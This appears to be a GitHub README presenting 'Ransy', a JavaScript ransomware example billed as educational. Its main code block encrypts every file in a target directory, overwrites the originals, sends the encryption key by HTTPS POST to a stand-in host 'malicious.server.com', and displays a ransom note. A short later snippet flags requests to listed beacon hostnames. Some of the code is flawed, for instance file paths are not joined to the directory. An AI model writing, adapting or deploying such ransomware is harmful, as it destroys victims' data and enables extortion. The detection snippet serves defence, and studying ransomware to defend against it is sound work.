
# Ransy - Code in JavaScript (Example) v2

##### RedTeam - Techniques for 'Offensive Security' by Volkan Sah - Simple Codings for Offensive Security (update 02/2023)

> [!WARNING]
> Please note that exploiting security vulnerabilities without permission and creating or using ransomware is illegal and unethical, and may result in criminal charges. Use this information responsibly and only on networks you have permission to access.

Ransomware attacks are one of the most destructive and malicious types of cyber threats, often resulting in significant financial losses and personal data theft. It is important to understand the mechanisms of ransomware attacks in order to protect yourself and your systems from these malicious threats.

This JavaScript code provides a simplified example of a ransomware attack and its underlying techniques. It is intended for educational and ethical hacking purposes only, and should not be used for any illegal or unethical activities. It is important to always abide by the law and use technology responsibly and ethically to promote positive outcomes for society.

## Example
```javascript
// Ransomware code (for demonstration purposes only)
var fs = require('fs');
var crypto = require('crypto');
var https = require('https');

// Directory to target for file encryption
var targetDirectory = '/user/files';

// Generate encryption key
var encryptionKey = crypto.randomBytes(32).toString('hex');

// Read all files in the target directory
fs.readdirSync(targetDirectory).forEach(file => {
  // Skip directories
  if (fs.lstatSync(file).isDirectory()) return;

  // Read file data
  var data = fs.readFileSync(file);

  // Encrypt file data with encryption key
  var cipher = crypto.createCipher('aes-256-cbc', encryptionKey);
  var encryptedData = cipher.update(data, 'utf8', 'hex') + cipher.final('hex');

  // Write encrypted data back to file
  fs.writeFileSync(file, encryptedData);
});

// Send beacon with encryption key (for demonstration purposes only)
var beaconData = JSON.stringify({ key: encryptionKey });
var options = {
  hostname: 'malicious.server.com',
  port: 443,
  path: '/beacon',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': beaconData.length
  }
};

var req = https.request(options, res => {
  console.log(`Beacon sent with status code: ${res.statusCode}`);
});

req.on('error', error => {
  console.error(`Error sending beacon: ${error}`);
});

req.write(beaconData);
req.end();

// Display ransom note to user
var ransomNote = `
Your files have been encrypted!
Contact us at malicious@server.com to get the decryption key.
`;

console.log(ransomNote);
```

## Note
As technology continues to advance, it's more important than ever to protect ourselves and our systems from malicious attacks. With the rise of dangerous JavaScript techniques that can be executed through the browser, it's crucial to take proactive measures to safeguard your browsing experience. By utilizing browser add-ons such as NoScript and Privacy Badger, you can protect yourself from potential threats and enjoy a safer, more secure online experience. Remember, it's not just about protecting yourself - it's about promoting a culture of responsible technology use that benefits society as a whole.

## Detecting Fallback and Beaconing Mechanisms
Ransomware often includes fallback mechanisms and beaconing to ensure it can still operate if initial commands fail. Here are some examples to detect such activities:

```javascript
// Detect beaconing attempts
var detectBeaconing = function() {
  var knownBeacons = ['malicious.server.com', 'another.malicious.com'];
  var networkRequests = getNetworkRequests(); // Hypothetical function to get network requests

  networkRequests.forEach(request => {
    if (knownBeacons.includes(request.hostname)) {
      console.warn(`Potential beacon detected to: ${request.hostname}`);
    }
  });
};

detectBeaconing();
```

## Disclaimer
The developer of this script is not responsible for any misuse or damage caused by this tool. It is the user's responsibility to ensure that they have the necessary permissions to use this tool on their chosen networks. Only for educational and ethical hacking purposes only!

## Issues
Issues for this script are not accepted as it is intended for educational purposes only and not for production use. However, you are welcome to make a Pull Request (PR) for contributions.

> [!WARNING]
> Exploiting security vulnerabilities without permission and creating or using ransomware is illegal and unethical, and may result in criminal charges.

## Your Support
If you find this project useful and want to support it, there are several ways to do so:

- If you find the white paper helpful, please ⭐ it on GitHub. This helps make the project more visible and reach more people.
- Become a Follower: If you're interested in updates and future improvements, please follow my GitHub account. This way you'll always stay up-to-date.
- Learn more about my work: I invite you to check out all of my work on GitHub and visit my developer site https://volkansah.github.io. Here you will find detailed information about me and my projects.
- Share the project: If you know someone who could benefit from this project, please share it. The more people who can use it, the better.
**If you appreciate my work and would like to support it, please visit my [GitHub Sponsor page](https://github.com/sponsors/volkansah). Any type of support is warmly welcomed and helps me to further improve and expand my work.**

Thank you for your support! ❤️

##### Copyright S. Volkan Kücükbudak

### License
This project is licensed under the MIT - see the [LICENSE](LICENSE) file for details.
